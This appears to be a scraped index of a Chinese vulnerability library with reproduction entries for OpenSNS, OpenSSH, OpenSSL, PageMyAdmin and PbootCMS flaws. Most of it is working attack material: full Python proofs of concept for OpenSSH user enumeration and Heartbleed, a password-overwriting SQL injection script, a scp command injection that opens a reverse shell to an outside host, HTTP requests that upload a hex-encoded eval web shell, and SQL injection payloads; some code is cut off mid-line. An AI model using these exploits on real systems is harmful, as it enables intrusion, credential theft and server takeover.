Modify: 2021-07-15 19:58:54 "},"Web安全/OpenSNS/OpenSNS代码执行漏洞/OpenSNS代码执行漏洞.html":{"url":"Web安全/OpenSNS/OpenSNS代码执行漏洞/OpenSNS代码执行漏洞.html","title":"OpenSNS代码执行漏洞","keywords":"","body":"OpenSNS代码执行漏洞 漏洞描述 OpenSNS是一款基于ThinkPHP的轻量级SNS框架，存在代码执行漏洞。 漏洞影响 OpenSNS FOFA icon_hash=\"1167011145\" 漏洞复现 官网下载源码：http://os.opensns.cn/product/index/download 解压 打开 很典型的一个使用tp框架的cms，控制器都在application目录下 然后粗略的看了一下所有能直接访问的控制器，没发现有明显漏洞的地方，但是发现了个比较可疑的方法。 在Weibo/ShareController 控制器中有一个shareBox方法 其中获取了query参数 然后url解码 在parse_str 将$query解析成数组，然后assign成模板变量 最后display模板。这里并没有对获取的参数进行操作，那就可能在模板里面对参数进行操作了，去看下模板内容 文件位于Weibo/View/default/Widget/share/sharebox.html 看到用了{:W()}这种写法 W方法位于Thinkphp/common/function.php 备注解释是渲染输出 调用了R方法 继续看一下 远程调用控制器的方法 {:W(‘Weibo/Share/fetchShare’,array(‘param’=>$parse_array))} 那这行代码就是调用fetchShare 方法，参数也就是之前获取的$query解析成得数组 那去看一下fetchShare方法,位于/Weibo/Widget/ShareWidget.class.php 接着调用了assginFetch方法，我们看下D方法 实例化模型类，那就是在Weibo/Model/ShareMode.class.php，然后又调用了getInfo方法 这里又调用了D方法，并且调用了有一个参数的方法。根据上面的了解，D方法可以实例化Model类，那可利用的范围就变大了，去找一下可以利用的方法，只要满足两个条件。 1.为Model类 2.方法只能有一个传入的参数 看下tp框架本身自带的Model类。/ThinkPHP/Library/Think/Model.class.php 找到一个可以实现sql注入的一个方法。但是我们可以尝试去寻找能实现代码执行的方法。 同文件下有个_validationFieldItem方法里面有call_user_func_array方法，如果能调用这个方法 并且两个参数都可控 那么就能实现代码执行。根据现在已知的条件，还不能利用 可以先记录一下。 找到一个可以利用的类，这是cms自己写的类。/Application/Common/Model/ScheduleModel.class.php 一个参数，为Model，满足这两个条件，然后看到又调用了D方法来实例化Model类，但是调用的方法为两个参数，结合上面找到的_validationFieldItem方法。按照流程构造poc，就能实现代码执行。 梳理一下漏洞触发流程： 1.ShareController.shareBox-> 2.ShareWidget. fetchShare-> 3.ShareWidget.assginFetch-> 4.ShareModel.getInfo(这里控制D方法生成ScheduleModel类，并调用传入一个参数的方法)-> 5.ScheduleModel.runSchedule(这里控制D方法生成Model类，并调用传入两个参数的方法)-> 6.Model._validationFieldItem 0x3 漏洞验证 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:50 "},"Web安全/OpenSSH/（CVE-2018-15473）OpenSSH 用户枚举漏洞/（CVE-2018-15473）OpenSSH 用户枚举漏洞.html":{"url":"Web安全/OpenSSH/（CVE-2018-15473）OpenSSH 用户枚举漏洞/（CVE-2018-15473）OpenSSH 用户枚举漏洞.html","title":"（CVE-2018-15473）OpenSSH 用户枚举漏洞","keywords":"","body":"（CVE-2018-15473）OpenSSH 用户枚举漏洞 一、漏洞简介 OpenSSH（OpenBSD安全外壳）是OpenBSD计划组的一套用于安全访问远程计算机的连接工具。该工具是SSH协议的开源实现，支持对所有的传输进行加密，可有效阻止窃听，连接劫持以及其他网络级OpenSSH 7.7及之前版本中存在信息中断。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可以利用入侵获取组件敏感信息。 二、漏洞影响 OpenSSH \\ 三、复现过程 这个漏洞存在于OpenSSH所实现的一些认证功能之中，首先我们一起看一看Ubuntu OpenSSH的公共密钥认证漏洞。 通过向一台OpenSSH服务器发送恶意的公共密钥认证消息，攻击者将能够获取特定的用户名信息。如果用户不存在，服务器将会向客户端发送认证失败的消息。如果用户存在，消息将无法解析并终止通信，即通信连接会在没有任何消息回传的情况下断开。关于该漏洞的漏洞利用代码可以从这个Python PoC脚本中获取： pip2 install --upgrade paramiko==2.4.1 pip2 install paramiko #!/usr/bin/env python # Copyright (c) 2018 Matthew Daley # # Permission is hereby granted, free of charge, to any person obtaining a copy # of this software and associated documentation files (the \"Software\"), to # deal in the Software without restriction, including without limitation the # rights to use, copy, modify, merge, publish, distribute, sublicense, and/or # sell copies of the Software, and to permit persons to whom the Software is # furnished to do so, subject to the following conditions: # # The above copyright notice and this permission notice shall be included in # all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR # IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, # FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE # AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING # FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS # IN THE SOFTWARE. import argparse import logging import paramiko import socket import sys class InvalidUsername(Exception): pass def add_boolean(*args, **kwargs): pass old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[ paramiko.common.MSG_SERVICE_ACCEPT] def service_accept(*args, **kwargs): paramiko.message.Message.add_boolean = add_boolean return old_service_accept(*args, **kwargs) def userauth_failure(*args, **kwargs): raise InvalidUsername() paramiko.auth_handler.AuthHandler._handler_table.update({ paramiko.common.MSG_SERVICE_ACCEPT: service_accept, paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure }) logging.getLogger('paramiko.transport').addHandler(logging.NullHandler()) arg_parser = argparse.ArgumentParser() arg_parser.add_argument('hostname', type=str) arg_parser.add_argument('--port', type=int, default=22) arg_parser.add_argument('username', type=str) args = arg_parser.parse_args() sock = socket.socket() try: sock.connect((args.hostname, args.port)) except socket.error: print '[-] Failed to connect' sys.exit(1) transport = paramiko.transport.Transport(sock) try: transport.start_client() except paramiko.ssh_exception.SSHException: print '[-] Failed to negotiate SSH transport' sys.exit(2) try: transport.auth_publickey(args.username, paramiko.RSAKey.generate(2048)) except InvalidUsername: print '[*] Invalid username' sys.exit(3) except paramiko.ssh_exception.AuthenticationException: print '[+] Valid username' 这个漏洞之所以存在，是因为服务器在对消息完整解析之前，用户查询了不存在的用户名。想要修复该漏洞也很简单，按攻击逻辑反着来就行了：首先对消息进行完整解析，然后再建立通信连接。 测试漏洞利用PoC的一种方法就是在调试模式下开启OpenSSH服务器： OpenSSH用户枚举漏洞/media/rId24.png) 然后用已存在的有效用户名运行PoC脚本： OpenSSH用户枚举漏洞/media/rId25.png) 在服务器端将会查看到错误提示： OpenSSH用户枚举漏洞/media/rId26.png) 相关错误信息还可以在/var/log/auth.log中找到： OpenSSH用户枚举漏洞/media/rId27.png) 如果无法正确解析消息，会导致客户端跟服务器端之间的通信中断，而且中断时不会收到服务器发送的提示信息： OpenSSH用户枚举漏洞/media/rId28.png) 注意粉红色标记的最后一个数据包（客户端数据包），这里没有后续的蓝色数据包（服务器数据包）。 当PoC脚本以不存在的用户名运行之后： OpenSSH用户枚举漏洞/media/rId29.png) 不会弹出\"imcomplete message\"错误提示： OpenSSH用户枚举漏洞/media/rId30.png) OpenSSH用户枚举漏洞/media/rId31.png) 注意通信数据结尾处的蓝色服务器数据包。 这就是该漏洞（公共密钥认证漏洞）暴露有效用户名的整个流程了。 其中，userauth_pubkey函数是认证功能所实现的其中一个函数，专门用于根据公共密钥来完成身份验证。如果认证失败，则返回\"0\"，成功则返回\"1\"。当服务器端接收到了SSH2_MSG_USERAUTH_REQUEST请求后，便会调用该函数，之后的结果会用来给客户端回传SSH2_MSG_USERAUTH_FAILURE或SSH2_MSG_USERAUTH_SUCCESS消息。 OpenSSH用户枚举漏洞/media/rId32.png) 该函数的运行逻辑为： \\1. 如果用户名不存在：返回\"0\"； \\2. 如果用户名存在但密钥错误：返回\"0\"； \\3. 如果用户名存在且密钥正确：返回\"1\"； 但是有人发现，我们竟然可以在第一步和第二步中间终止userauth_pubkey函数的运行。第一步执行完后，userauth_pubkey函数会从客户端获取消息字符串，如果获取失败（恶意字符串导致），整个过程都会终止，并在不发送任何回传消息的情况下关闭连接。 packet_get_string所导致的情况如下： OpenSSH用户枚举漏洞/media/rId33.png) 如果用户名存在，第一步会在程序从消息域中提取完数据后进行。 第一个提取的数据域是一个布尔值（1字节），对应函数为packet_get_char()。如果认证类型为publickey，返回值就是\"1\"。后续跟着的是两个字符串：算法和密钥。在SSH消息中，字符串会以一个\"长度-值\"键值对进行编码，一个字符串为4个字节。 函数packet_get_string可以从消息中提取字符串，并对其进行验证，这个函数还需要依赖另一个函数：ssh_ssh_packet_get_string。 OpenSSH用户枚举漏洞/media/rId34.png) ssh_packet_get_string函数会调用sshpkt_get_string函数，如果返回的值不是\"0\"，它还会调用fatal函数。函数fatal会记录致命的错误事件，然后终止生成的OpenSSH进程（不回传任何错误信息）。 OpenSSH用户枚举漏洞/media/rId35.png) 接下来会执行sshpkt_get_string函数并调用sshbuf_get_string函数： OpenSSH用户枚举漏洞/media/rId36.png) 然后sshbuf_get_string函数会调用sshbuf_get_string_direct： OpenSSH用户枚举漏洞/media/rId37.png) 然后sshbuf_get_string_direct会调用sshbuf_peek_string_direct: OpenSSH用户枚举漏洞/media/rId38.png) 最后，sshbuf_peek_string_direct会进行字符串验证： OpenSSH用户枚举漏洞/media/rId39.png) 如果消息中剩余数据小于4字节，或者说消息中的剩余数据小于字符串长度，则会返回SSH_ERR_MESSAGE_INCOMPLETE 错误消息。这就是我们之前那个Python PoC脚本所要触发的东西。首先，它会跟OpenSSH服务器建立一条加密的通信链接，然后向其发送恶意的SSH2_MSG_USERAUTH_REQUEST消息。通过重定义add_boolean函数，消息中的布尔值域会被忽略。 当函数userauth_pubkey解析了恶意消息之后，首先会读取布尔值域，由于这个域其实是不存在的，因此读取的会是下一个域（函数packet_get_char）：加密算法字符串的4字节长度值。然后调用下一个函数packet_get_string来读取加密算法字符串。 下面是解析合法消息的过程： OpenSSH用户枚举漏洞/media/rId40.png) 下面是解析恶意消息的过程： OpenSSH用户枚举漏洞/media/rId41.png) 结果就是，代码解析了一个1907字节的字符串（十六进制为0×00000773），这比整个消息的长度还要长，这会导致ssh_packet_get_string调用fatal函数，并中断OpenSSH进程。 poc补充 不知道为什么上面那个poc运行就报错了。这里找了一个能用的poc Examples A single username (cve-2018-15473)─> ./ssh-username-enum.py -u epi 192.168.1.2 [+] epi found! Use a wordlist with 10 threads (the default is 4) (cve-2018-15473)─> ./ssh-username-enum.py -t 10 -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt 192.168.1.2 [+] avahi found! [+] avahi-autoipd found! [+] backup found! [+] daemon found! [+] bin found! ------8 IPv6 Address on port 2222 and INCREASED VERBOSITY! (cve-2018-15473)─> ./ssh-username-enum.py -6 -p 2222 -v -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt '::1' [-] 4Dgifts not found [-] demo not found [-] checkfs not found [-] anon not found [-] EZsetup not found [-] auditor not found [-] demos not found [-] OutOfBox not found [-] checkfsys not found [+] avahi found! [-] diag not found [-] ROOT not found [-] checksys not found [-] cmwlogin not found [+] avahi-autoipd found! ------8 requirements.txt asn1crypto==0.24.0> bcrypt==3.1.4> cffi==1.11.5> cryptography==2.3.1> idna==2.7> paramiko==2.4.1> pyasn1==0.4.4> pycparser==2.18> PyNaCl==1.2.1> six==1.11.0 #!/usr/bin/env python3 \"\"\" derived from work done by Matthew Daley https://bugfuzz.com/stuff/ssh-check-username.py props to Justin Gardner for the add_boolean workaround CVE-2018-15473 -------------- OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed, related to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c. Author: epi https://epi052.gitlab.io/notes-to-self/ https://gitlab.com/epi052/cve-2018-15473 \"\"\" import sys import re import socket import logging import argparse import multiprocessing from typing import Union from pathlib import Path import paramiko assert sys.version_info >= (3, 6), \"This program requires python3.6 or higher\" class Color: \"\"\" Class for coloring print statements. Nothing to see here, move along. \"\"\" BOLD = '\\033[1m' ENDC = '\\033[0m' RED = '\\033[38;5;196m' BLUE = '\\033[38;5;75m' GREEN = '\\033[38;5;149m' YELLOW = '\\033[38;5;190m' @staticmethod def string(string: str, color: str, bold: bool = False) -> str: \"\"\" Prints the given string in a few different colors. Args: string: string to be printed color: valid colors \"red\", \"blue\", \"green\", \"yellow\" bold: T/F to add ANSI bold code Returns: ANSI color-coded string (str) \"\"\" boldstr = Color.BOLD if bold else \"\" colorstr = getattr(Color, color.upper()) return f'{boldstr}{colorstr}{string}{Color.ENDC}' class InvalidUsername(Exception): \"\"\" Raise when username not found via CVE-2018-15473. \"\"\" def apply_monkey_patch() -> None: \"\"\" Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST. patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict _parse_service_accept _parse_userauth_failure _handler_table = { MSG_SERVICE_REQUEST: _parse_service_request, MSG_SERVICE_ACCEPT: _parse_service_accept, MSG_USERAUTH_REQUEST: _parse_userauth_request, MSG_USERAUTH_SUCCESS: _parse_userauth_success, MSG_USERAUTH_FAILURE: _parse_userauth_failure, MSG_USERAUTH_BANNER: _parse_userauth_banner, MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request, MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response, } \"\"\" def patched_add_boolean(*args, **kwargs): \"\"\" Override correct behavior of paramiko.message.Message.add_boolean, used to produce malformed packets. \"\"\" auth_handler = paramiko.auth_handler.AuthHandler old_msg_service_accept = auth_handler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] def patched_msg_service_accept(*args, **kwargs): \"\"\" Patches paramiko.message.Message.add_boolean to produce a malformed packet. \"\"\" old_add_boolean, paramiko.message.Message.add_boolean = paramiko.message.Message.add_boolean, patched_add_boolean retval = old_msg_service_accept(*args, **kwargs) paramiko.message.Message.add_boolean = old_add_boolean return retval def patched_userauth_failure(*args, **kwargs): \"\"\" Called during authentication when a username is not found. \"\"\" raise InvalidUsername(*args, **kwargs) auth_handler._client_handler_table.update({ paramiko.common.MSG_SERVICE_ACCEPT: patched_msg_service_accept, paramiko.common.MSG_USERAUTH_FAILURE: patched_userauth_failure }) def create_socket(hostname: str, port: int) -> Union[socket.socket, None]: \"\"\" Small helper to stay DRY. Returns: socket.socket or None \"\"\" # spoiler alert, I don't care about the -6 flag, it's really # just to advertise in the help that the program can handle ipv6 try: return socket.create_connection((hostname, port)) except socket.error as e: print(f'socket error: {e}', file=sys.stdout) def connect(username: str, hostname: str, port: int, verbose: bool = False, **kwargs) -> None: \"\"\" Connect and attempt keybased auth, result interpreted to determine valid username. Args: username: username to check against the ssh service hostname: hostname/IP of target port: port where ssh is listening key: key used for auth verbose: bool value; determines whether to print 'not found' lines or not Returns: None \"\"\" sock = create_socket(hostname, port) if not sock: return transport = paramiko.transport.Transport(sock) try: transport.start_client() except paramiko.ssh_exception.SSHException: return print(Color.string(f'[!] SSH negotiation failed for user {username}.', color='red')) try: transport.auth_publickey(username, paramiko.RSAKey.generate(1024)) except paramiko.ssh_exception.AuthenticationException: print(f\"[+] {Color.string(username, color='yellow')} found!\") except InvalidUsername: if not verbose: return print(f'[-] {Color.string(username, color=\"red\")} not found') def main(**kwargs): \"\"\" main entry point for the program \"\"\" sock = create_socket(kwargs.get('hostname'), kwargs.get('port')) if not sock: return banner = sock.recv(1024).decode() regex = re.search(r'-OpenSSH_(?P\\d\\.\\d)', banner) if regex: try: version = float(regex.group('version')) except ValueError: print(f'[!] Attempted OpenSSH version detection; version not recognized.\\n[!] Found: {regex.group(\"version\")}') else: ver_clr = 'green' if version 参考链接 https://www.freebuf.com/vuls/184583.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:58:55 "},"Web安全/OpenSSH/（CVE-2020-15778）OpenSSH 命令注入漏洞/（CVE-2020-15778）OpenSSH 命令注入漏洞.html":{"url":"Web安全/OpenSSH/（CVE-2020-15778）OpenSSH 命令注入漏洞/（CVE-2020-15778）OpenSSH 命令注入漏洞.html","title":"（CVE-2020-15778）OpenSSH 命令注入漏洞","keywords":"","body":"（CVE-2020-15778）OpenSSH 命令注入漏洞 一、漏洞简介 实际环境中的利用方案以及场景：对于用户来说，ssh被阻止，但authorized_keys文件中的命令选项允许使用scp的情况。您可以绕过此限制并在远程服务器上执行命令。也就是说，实际中通过各种手段获取到了ssh的用户密码，但是不允许ssh连接，或者ip等各种限制，可以尝试此漏洞进行利用。 二、漏洞影响 OpenSSH \\ 三、复现过程 命令执行 scp 1.txt root@ip:'`touch /root/test2.txt`/root/12111.txt' OpenSSH命令注入漏洞/media/rId25.png) 反弹shell scp test.txt test@192.168.136.133:'`bash -i >& /dev/tcp/192.168.136.129/7777 0>&1`/tmp/test3.txt' OpenSSH命令注入漏洞/media/rId27.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:00 "},"Web安全/OpenSSL/（CVE-2014-0160）OpenSSL 心脏出血漏洞/（CVE-2014-0160）OpenSSL 心脏出血漏洞.html":{"url":"Web安全/OpenSSL/（CVE-2014-0160）OpenSSL 心脏出血漏洞/（CVE-2014-0160）OpenSSL 心脏出血漏洞.html","title":"（CVE-2014-0160）OpenSSL 心脏出血漏洞","keywords":"","body":"（CVE-2014-0160）OpenSSL 心脏出血漏洞 一、漏洞简介 Heartbleed漏洞，这项严重缺陷(CVE-2014-0160)的产生是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。 二、漏洞影响 OpenSSL 1.0.2-betaOpenSSL 1.0.1 -- OpenSSL 1.0.1f 三、复现过程 poc OpenSSL心脏出血漏洞/media/rId25.jpg) #!/usr/bin/python # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org) # The author disclaims copyright to this source code. import sys import struct import socket import time import select import re from optparse import OptionParser options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)') options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)') def h2bin(x): return x.replace(' ', '').replace('\\n', '').decode('hex') hello = h2bin(''' 16 03 02 00 dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00 00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11 00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00 00 0f 00 01 01 ''') hb = h2bin(''' 18 03 02 00 03 01 40 00 ''') def hexdump(s): for b in xrange(0, len(s), 16): lin = [c for c in s[b : b + 16]] hxdat = ' '.join('%02X' % ord(c) for c in lin) pdat = ''.join((c if 32 0: rtime = endtime - time.time() if rtime BHH', hdr) pay = recvall(s, ln, 10) if pay is None: print 'Unexpected EOF receiving record payload - server closed connection' return None, None, None print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)) return typ, ver, pay def hit_hb(s): s.send(hb) while True: typ, ver, pay = recvmsg(s) if typ is None: print 'No heartbeat response received, server likely not vulnerable' return False if typ == 24: print 'Received heartbeat response:' hexdump(pay) if len(pay) > 3: print 'WARNING: server returned more data than it should - server is vulnerable!' else: print 'Server processed malformed heartbeat, but did not return any extra data.' return True if typ == 21: print 'Received alert:' hexdump(pay) print 'Server returned error, likely not vulnerable' return False def main(): opts, args = options.parse_args() if len(args) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:01 "},"Web安全/PageMyAdmin/PageMyAdmin sql注入漏洞/PageMyAdmin sql注入漏洞.html":{"url":"Web安全/PageMyAdmin/PageMyAdmin sql注入漏洞/PageMyAdmin sql注入漏洞.html","title":"PageMyAdmin sql注入漏洞","keywords":"","body":"PageMyAdmin sql注入漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 poc #!/usr/bin/env python # -*- coding: utf-8 -*- import urllib2 import urllib import re import sys def main(): url=sys.argv[1]+\"/e/aspx/post.aspx\" fun=sys.argv[2] if fun=='upass': update(url) elif fun=='sqlinject': sqlinject(url) elif fun=='Backstage': Backstage(url) else: print''' usage: pageadminsql.py http://www.baidu.com/ upass parameter: uppass sqlinject Backstage ''' def update(url): headers = {\"User-Agent\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\",\"Referer\":url+\"?a=pageadmin_cms\"} formate={ \"siteid\":\"1\", \"formtable\":\"1\", \"thedata\":'[u][k]pa_member[k][s][k]userpassword=\"1527f10a11de5efea4b8516213413c103df55126\"[k]where[k]id=2' } postdata = urllib.urlencode(formate) request = urllib2.Request(url, data=postdata, headers = headers) try: response = urllib2.urlopen(request) if response.getcode()==200: print u\">>>>>>修改密码成功 修改密码：admin_1234213>>>>>修改密码失败>>>>>密码注入成功 查看密码地址：{0}/index.aspx?lanmuid=63&sublanmuid=654&id=747>>>>>密码注入失败>>>>>后台地址注入成功 查看后台地址：{0}/index.aspx?lanmuid=63&sublanmuid=654&id=747>>>>>后台地址注入失败Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:02 "},"Web安全/PageMyAdmin/PageMyAdmin文件上传getshell/PageMyAdmin文件上传getshell.html":{"url":"Web安全/PageMyAdmin/PageMyAdmin文件上传getshell/PageMyAdmin文件上传getshell.html","title":"PageMyAdmin文件上传getshell","keywords":"","body":"PageMyAdmin文件上传getshell 一、漏洞简介 二、漏洞影响 三、复现过程 先set增加ashx白名单-> POST /e/aspx/upload.aspx?a=pageadmin_cms HTTP/1.1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36 Cookie: ASP.NET_SessionId=c53k11452napjc45ibfuaw55 Referer: http://www.0-sec.org/e/aspx/upload.aspx?a=pageadmin_cms Host: www.0-sec.org Content-Length: 106 Connection: Keep-Alive submit=1&swf_upload=2&table=pa_field&field=file_ext=\".jpg,.jpeg,.gif,.bmp,.ashx\" where id=174 and max_num 返回包 HTTP/1.1 200 OK Cache-Control: private Content-Length: 72 Content-Type: text/html; charset=utf-8 Server: Microsoft-IIS/7.5 X-AspNet-Version: 2.0.50727 Date: Sat, 13 Jul 2019 07:52:02 GMT location.href='?result=cs_error' 第二步 在上传ashx-> POST /e/aspx/upload.aspx HTTP/1.1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */* Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzBItOAbA8GrZ7s49 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36 Cookie: ASP.NET_SessionId=c53k11452napjc45ibfuaw55 Referer: http://www.0-sec.org/e/aspx/upload_p ... pic&from=master Host: www.0-sec.org Content-Length: 2318 ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"file\"; filename=\"005.ashx\" Content-Type: image/jpeg using System; using System.Web; using System.IO; public class Handler : IHttpHandler { public bool IsReusable { get { return false; } } public void ProcessRequest(HttpContext context) { byte[] b={0x3C, 0x25, 0x40, 0x20, 0x50, 0x61, 0x67, 0x65, 0x20, 0x4C, 0x61, 0x6E, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3D, 0x22, 0x4A, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x22, 0x25, 0x3E, 0x3C, 0x25, 0x65, 0x76, 0x61, 0x6C, 0x28, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x2E, 0x49, 0x74, 0x65, 0x6D, 0x5B, 0x22, 0x70, 0x61, 0x73, 0x73, 0x22, 0x5D, 0x2C, 0x22, 0x75, 0x6E, 0x73, 0x61, 0x66, 0x65, 0x22, 0x29, 0x3B, 0x25, 0x3E}; try { File.WriteAllBytes(context.Server.MapPath(\"/e/upload/s1/article/file/\")+\"/file.aspx\",b); context.Response.Write(\"oooooooookkkkkkkkk\"); } catch(Exception ex) { context.Response.Write(ex.Message); } context.Response.End(); } } ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"width\" 400 ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"height\" 400 ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"url\" ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"filesize\" 0 ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"username\" admin ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"sid\" 1 ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"type\" file ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"table\" article ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"field\" titlepic ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"from\" master ------WebKitFormBoundaryzBItOAbA8GrZ7s49 Content-Disposition: form-data; name=\"submit\" 1 ------WebKitFormBoundaryzBItOAbA8GrZ7s49-- 发送第二步返回shell 参考链接 https://www.t00ls.net/viewthread.php?tid=52096&highlight=PageMyadmin Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:03 "},"Web安全/PbootCMS/（CVE-2018-16356）PbootCMS sql注入漏洞/（CVE-2018-16356）PbootCMS sql注入漏洞.html":{"url":"Web安全/PbootCMS/（CVE-2018-16356）PbootCMS sql注入漏洞/（CVE-2018-16356）PbootCMS sql注入漏洞.html","title":"（CVE-2018-16356）PbootCMS sql注入漏洞","keywords":"","body":"（CVE-2018-16356）PbootCMS sql注入漏洞 一、漏洞简介 PbootCMS是一款使用PHP语言开发的开源企业建站内容管理系统（CMS）。 PbootCMS中存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。 二、漏洞影响 三、复现过程 http://www.0-sec.org/api.php/List/index?order=123 $order参数是我们可以控制的 PbootCMSsql注入漏洞/media/rId24.png) 转到函数getList，该参数在函数顺序中使用 PbootCMSsql注入漏洞/media/rId25.png) 再去看function order函数 PbootCMSsql注入漏洞/media/rId26.png) PbootCMSsql注入漏洞/media/rId27.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:42 "},"Web安全/PbootCMS/（CVE-2018-16357）PbootCMS sql注入漏洞/（CVE-2018-16357）PbootCMS sql注入漏洞.html":{"url":"Web安全/PbootCMS/（CVE-2018-16357）PbootCMS sql注入漏洞/（CVE-2018-16357）PbootCMS sql注入漏洞.html","title":"（CVE-2018-16357）PbootCMS sql注入漏洞","keywords":"","body":"（CVE-2018-16357）PbootCMS sql注入漏洞 一、漏洞简介 PbootCMS是一款使用PHP语言开发的开源企业建站内容管理系统（CMS）。 PbootCMS中存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。 二、漏洞影响 三、复现过程 http://www.0-sec.org/api.php/Cms/search?#acode=1&num=1&order=1 参数$field是我们可以控制的，去检查函数过滤器 PbootCMSsql注入漏洞/media/rId24.png) 使用函数trim和escape字符串避免sql注入 PbootCMSsql注入漏洞/media/rId25.png) 添加a\\'会导致mysql语法错误，因此函数escape\\u字符串无效 PbootCMSsql注入漏洞/media/rId26.png) 使用/**/绕过 payload: field=1)/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/user()),0x7e),1)#&keyword=title&scode=1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:59:43 "},"Web安全/PbootCMS/PbootCMS 3.0.4 SQL注入漏洞/PbootCMS 3.0.4 SQL注入漏洞.html":{"url":"Web安全/PbootCMS/PbootCMS 3.0.4 SQL注入漏洞/PbootCMS 3.0.4 SQL注入漏洞.html","title":"PbootCMS 3.0.4 SQL注入漏洞","keywords":"","body":"PbootCMS 3.0.4 SQL注入漏洞 漏洞描述 PbootCMS是全新内核且永久开源免费的PHP企业网站开发建设管理系统，是一套高效、简洁、 强悍的可免费商用的PHP CMS源码，但存在SQL注入漏洞，攻击者可构造恶意语句进行获取敏感数据。 漏洞影响 PbootCMS3.0.4 FOFA app=\"PBOOTCMS\" 源码分析 漏洞代码位置： core\\basic\\Model.php 